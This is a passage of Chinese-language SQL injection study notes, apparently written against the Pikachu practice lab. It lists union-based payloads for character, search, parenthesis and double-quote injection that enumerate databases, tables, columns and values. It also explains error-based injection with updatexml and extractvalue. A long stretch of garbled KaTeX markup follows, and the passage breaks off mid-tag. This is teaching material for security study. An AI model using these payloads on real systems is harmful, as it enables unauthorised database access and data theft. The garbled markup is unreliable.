比如传进去 C1everF0x’ or 1=1#，结果就是 ‘C1everF0x’ or 1=1#’，&lt;br&gt;
C1everF0x 就被闭合掉，中间的 or 1=1 就是 sql 注入攻击语句&lt;br&gt;
 (1) 利用 1’ order by 判断字段数&lt;br&gt;
 (2) 显位：联合查询查看显示位&lt;br&gt;
 1’ union select 1,2 #&lt;br&gt;
(3) 爆库：显示出数据库名字&lt;br&gt;
 1’ union select 1,group_concat (schema_name) from (information_schema.schemata)#   所有数据库&lt;br&gt;
或&lt;br&gt;
 1’ union select 1,database ()#  当前数据库&lt;br&gt;
 (4) 爆表：利用 union select 联合查询，获取表名  columns_priv&lt;br&gt;
1’ union select 1,group_concat (table_name) from information_schema.tables where table_schema=database ()#    当前数据库的表&lt;br&gt;
 1’union select 1,group_concat (table_name) from (information_schema.tables) where table_schema=‘数据库名字’ #  指定名称数据库的表&lt;br&gt;
 (5) 爆列：利用 union select 联合查询，获取字段名&lt;br&gt;
 1’ union select 1,group_concat (column_name) from information_schema.columns where table_schema=database () and table_name=‘表名’ #  当前数据库的指定表名&lt;br&gt;
 1’ union select 1,group_concat (column_name) from (information_schema.columns) where table_name=‘表名’ #  在所有数据库中指定一个表名&lt;br&gt;
 (6) 爆值：利用 union select 联合查询，获取字段值&lt;br&gt;
 1’ union select 1,group_concat (concat_ws (表名对应的字段名)) from (表名)      在当前数据库中的相应表名的字段值&lt;br&gt;
或&lt;br&gt;
 1’ union select 1,group_concat (表名对应的字段名) from (数据库。表名)    在所有数据库中对应表名的字段值&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;span id=&#34;搜索型注入&#34;&gt; 搜索型注入&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;概念&lt;br&gt;
当在搜索框搜索的时候，称为搜索型。搜索型与数字型注入最大的区别在于：数字型不需要百分号闭合，而搜索类型一般要使用百分号来闭合。&lt;br&gt;
搜索型：select * from user where password like ‘%$pwd%’;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;判断&lt;br&gt;
使用 keywords% &#39;and 1=1 and ‘%’=&#39; 和 keywords% ‘and 1=2 and ‘%’=’&lt;br&gt;
select username from user where username like ‘%keyword% ‘and 1=1 and ‘%’=’%’   (true)&lt;br&gt;
select username from user where username like ‘%keyword% ‘and 1=2 and ‘%’=’%’  (false)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;x%’ or 1 = 1 #&lt;br&gt;
(1) 利用 1’ order by 判断字段数&lt;br&gt;
 (2) 显位：联合查询 x% 查看显示位&lt;br&gt;
 x%’ union select 1,2 #&lt;br&gt;
(3) 爆库：显示出数据库名字&lt;br&gt;
 x%’ union select 1,group_concat (schema_name) from (information_schema.schemata)#&lt;br&gt;
或  所有数据库&lt;br&gt;
 x%’ union select 1,database ()#  当前数据库&lt;br&gt;
 (4) 爆表：利用 union select 联合查询，获取表名&lt;br&gt;
 x%’ union select 1,group_concat (table_name) from information_schema.tables where table_schema=database ()#    当前数据库的表&lt;br&gt;
 x%’ union select 1,group_concat (table_name) from (information_schema.tables) where table_schema=‘数据库名字’ #  指定名称数据库的表&lt;br&gt;
 (5) 爆列：利用 union select 联合查询，获取字段名&lt;br&gt;
 x%’ union select 1,group_concat (column_name) from information_schema.columns where table_schema=database () and table_name=‘表名’ #  当前数据库的指定表名&lt;br&gt;
 x%’ union select 1,group_concat (column_name) from (information_schema.columns) where table_name=‘表名’ #  在所有数据库中指定一个表名&lt;br&gt;
 (6) 爆值：利用 union select 联合查询，获取字段值&lt;br&gt;
 x%’ union select 1,group_concat (concat_ws (‘分隔符’, 表名对应的字段名)) from (表名)      在当前数据库中的相应表名的字段值&lt;br&gt;
或&lt;br&gt;
 x%’ union select 1,group_concat (表名对应的字段名) from (数据库。表名)    在所有数据库中对应表名的字段值&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;举例：&lt;/p&gt;
&lt;p&gt;所有数据库&lt;/p&gt;
&lt;p&gt;information_schema,mysql,performance_schema,pikachu,sys&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;pikachu&lt;/p&gt;
&lt;p&gt;表：httpinfo,member,message,users,xssblind&lt;/p&gt;
&lt;p&gt;httpinfo&lt;/p&gt;
&lt;p&gt;列：id,userid,ipaddress,useragent,httpaccept,remoteport&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;id&lt;/th&gt;
&lt;th&gt;userid&lt;/th&gt;
&lt;th&gt;ipaddress&lt;/th&gt;
&lt;th&gt;useragent&lt;/th&gt;
&lt;th&gt;httpaccept&lt;/th&gt;
&lt;th&gt;remoteport&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2&gt;&lt;span id=&#34;xx-型注入&#34;&gt; xx 型注入&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;概念&lt;br&gt;
这种情况很少见，是程序员不规则操作造成的，一般不会单独归为一类。&lt;br&gt;
xx 型：select * from users where username = (’$name’)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;判断&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;xx’) or 1=1#&lt;/p&gt;
&lt;p&gt;(1) 利用 x’) order by 判断字段数&lt;br&gt;
 (2) 显位：联合查询 x% 查看显示位&lt;br&gt;
 x’) union select 1,2 #&lt;br&gt;
(3) 爆库：显示出数据库名字&lt;br&gt;
 x’) union select 1,group_concat (schema_name) from (information_schema.schemata)#&lt;br&gt;
或  所有数据库&lt;br&gt;
 x’) union select 1,database ()#  当前数据库&lt;br&gt;
 (4) 爆表：利用 union select 联合查询，获取表名&lt;br&gt;
 x’) union select 1,group_concat (table_name) from information_schema.tables where table_schema=database ()#    当前数据库的表&lt;br&gt;
 x’) union select 1,group_concat (table_name) from (information_schema.tables) where table_schema=‘数据库名字’ #  指定名称数据库的表&lt;br&gt;
 (5) 爆列：利用 union select 联合查询，获取字段名&lt;br&gt;
 x’) union select 1,group_concat (column_name) from information_schema.columns where table_schema=database () and table_name=‘表名’ #  当前数据库的指定表名&lt;br&gt;
 x’) union select 1,group_concat (column_name) from (information_schema.columns) where table_name=‘表名’ #  在所有数据库中指定一个表名&lt;br&gt;
 (6) 爆值：利用 union select 联合查询，获取字段值&lt;br&gt;
 x’) union select 1,group_concat (concat_ws (表名对应的字段名)) from (表名)      在当前数据库中的相应表名的字段值&lt;br&gt;
或&lt;br&gt;
 x’) union select 1,group_concat (表名对应的字段名) from (数据库。表名)    在所有数据库中对应表名的字段值&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;span id=&#34;双引号注入&#34;&gt; 双引号注入&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;双引号型：select * from users where username = (&amp;quot;$name&amp;quot;)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;判断&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;xx&amp;quot;) or 1=1#&lt;/p&gt;
&lt;p&gt;(1) 利用 x&amp;quot;) order by 判断字段数&lt;br&gt;
 (2) 显位：联合查询 x% 查看显示位&lt;br&gt;
 x&amp;quot;) union select 1,2 #&lt;br&gt;
(3) 爆库：显示出数据库名字&lt;br&gt;
 x&amp;quot;) union select 1,group_concat (schema_name) from (information_schema.schemata)#&lt;br&gt;
或  所有数据库&lt;br&gt;
 x&amp;quot;) union select 1,database ()#  当前数据库&lt;br&gt;
 (4) 爆表：利用 union select 联合查询，获取表名&lt;br&gt;
 x&amp;quot;) union select 1,group_concat (table_name) from information_schema.tables where table_schema=database ()#    当前数据库的表&lt;br&gt;
 x&amp;quot;) union select 1,group_concat (table_name) from (information_schema.tables) where table_schema=‘数据库名字’ #  指定名称数据库的表&lt;br&gt;
 (5) 爆列：利用 union select 联合查询，获取字段名&lt;br&gt;
 x&amp;quot;) union select 1,group_concat (column_name) from information_schema.columns where table_schema=database () and table_name=‘表名’ #  当前数据库的指定表名&lt;br&gt;
 x&amp;quot;) union select 1,group_concat (column_name) from (information_schema.columns) where table_name=‘表名’ #  在所有数据库中指定一个表名&lt;br&gt;
 (6) 爆值：利用 union select 联合查询，获取字段值&lt;br&gt;
 x&amp;quot;) union select 1,group_concat (concat_ws (表名对应的字段名)) from (表名)      在当前数据库中的相应表名的字段值&lt;br&gt;
或&lt;br&gt;
 x&amp;quot;) union select 1,group_concat (表名对应的字段名) from (数据库。表名)    在所有数据库中对应表名的字段值&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;span id=&#34;基于报错注入&#34;&gt; 基于报错注入&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;部分网站不直接引用数据库查询结果并将其显示在页面上，而是仅仅只返回查询成功与否的状态，那么在这种情况下，就很难利用联合查询的方式来进行注入。&lt;/p&gt;
&lt;p&gt;为了解决这一难题，我们引入了报错注入这一新的攻击方式。其思路就是，虽然网站不将数据查询结果直接返回到前端，但是如果我们人为地引发数据库的错误，那么数据库会将报错信息返回给前端。如果我们可以构造恰当的报错语句，使得数据库返回给我们的报错信息夹带上我们所需要查询的数据，就可以顺利的通过报错的方式来完成注入。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在 mysql 高版本（大于 5.1 版本）中添加了对 XML 文档进行查询和修改的函数：&lt;br&gt;
updatexml（）&lt;br&gt;
extractvalue（）&lt;br&gt;
当这两个函数在执行时，如果出现 xml 文档路径错误就会产生报错&lt;/li&gt;
&lt;li&gt;updatexml（）函数&lt;br&gt;
 updatexml（）是一个使用不同的 xml 标记匹配和替换 xml 块的函数。&lt;br&gt;
作用：改变文档中符合条件的节点的值&lt;br&gt;
语法： updatexml（XML_document，XPath_string，new_value） 第一个参数：是 string 格式，为 XML 文档对象的名称，文中为 Doc 第二个参数：代表路径，Xpath 格式的字符串例如 //title【@lang】 第三个参数：string 格式，替换查找到的符合条件的数据&lt;br&gt;
 updatexml 使用时，当 xpath_string 格式出现错误，mysql 则会爆出 xpath 语法错误（xpath syntax）&lt;br&gt;
例如： select * from test where ide = 1 and (updatexml (1,0x7e,3)); 由于 0x7e 是～，不属于 xpath 语法格式，因此报出 xpath 语法错误。&lt;/li&gt;
&lt;li&gt;extractvalue（）函数&lt;br&gt;
此函数从目标 XML 中返回包含所查询值的字符串 语法：extractvalue（XML_document，xpath_string） 第一个参数：string 格式，为 XML 文档对象的名称 第二个参数：xpath_string（xpath 格式的字符串） select * from test where id=1 and (extractvalue (1,concat (0x7e,(select user ()),0x7e)));&lt;br&gt;
extractvalue 使用时当 xpath_string 格式出现错误，mysql 则会爆出 xpath 语法错误（xpath syntax）&lt;br&gt;
select user,password from users where user_id=1 and (extractvalue(1,0x7e));&lt;br&gt;
 由于 0x7e 就是～不属于 xpath 语法格式，因此报出 xpath 语法错误。&lt;/li&gt;
&lt;li&gt;SQL 语句：&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;q&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;&amp;quot;&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;)&lt;/mo&gt;&lt;mi&gt;v&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;msup&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;query=&amp;quot;insert into member(username,pw,sex,phonenum,email,address) values(&amp;#x27;&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.625em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;q&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.001892em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;username’,‘&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;msup&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;msup&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;password&amp;#x27;,&amp;#x27;&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.946332em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;sex’,‘&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;msup&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;msup&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;phonenum&amp;#x27;,&amp;#x27;&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.946332em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span 